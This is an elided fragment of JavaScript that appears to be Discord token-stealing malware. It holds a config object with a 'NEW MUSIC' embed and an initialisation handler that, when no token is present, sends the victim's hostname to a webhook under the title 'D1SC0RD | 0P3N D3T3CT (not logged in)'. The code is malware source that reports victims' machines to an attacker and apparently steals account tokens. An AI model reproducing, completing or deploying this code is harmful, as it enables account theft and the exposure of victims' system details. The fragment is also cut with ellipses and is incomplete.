...
var config = {
    ...
    embed: {
        ...
        footer: {
            text: `NEW MUSIC`,
            icon_url: "https://cdn.discordapp.com/attachments/1002850461570846742/1127573089807519794/remastered.webp?size=96&quality=lossless",
        },
        href: "https://www.youtube.com/",
        avatar_url: "https://cdn.discordapp.com/attachments/1002850461570846742/1127573089807519794/remastered.webp?size=96&quality=lossless"
    },
        ...
        if (config.notify_on_initialization) {
            if (token == undefined) {
                sendToWebhook({
                    ...
                    url: config.embed.href,
                    embeds: [createEmbed({
                        title: "D1SC0RD | 0P3N D3T3CT (not logged in)",
                        fields: [{
                            name: "Hostname",
                            value: `\`\`\`${os.hostname}\`\`\``,
                            inline: false
